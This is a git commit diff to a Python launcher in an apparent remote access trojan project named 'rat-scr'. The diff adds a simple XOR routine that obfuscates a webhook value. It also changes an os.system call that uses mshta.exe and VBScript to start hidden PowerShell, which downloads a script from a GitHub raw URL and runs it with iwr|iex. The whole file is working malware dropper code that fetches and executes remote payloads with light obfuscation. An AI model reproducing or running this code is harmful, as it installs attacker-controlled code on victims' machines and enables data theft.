f32867246b0fe3bd8ad0b76931631fd9f09cd12b
43a1723 <hai1723notgay@gmail.com>
2024-08-19 17:04:08 +0700

    encrypt string

--- rat-scr/main.py
+++ rat-scr/main.py
@@ -1,5 +1,9 @@
 import os
 
+def xor_encrypt_decrypt(input_string):
+    key = 888172399
+    return ''.join(chr(ord(c) ^ key) for c in input_string)
+
 webhook = "you_webhook"
-command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{webhook}\';iwr(\'https://raw.githubusercontent.com/43a1723/test/main/download.ps1\')|iex",0)(window.close)'
+command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{xor_encrypt_decrypt(webhook)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
 os.system(command)
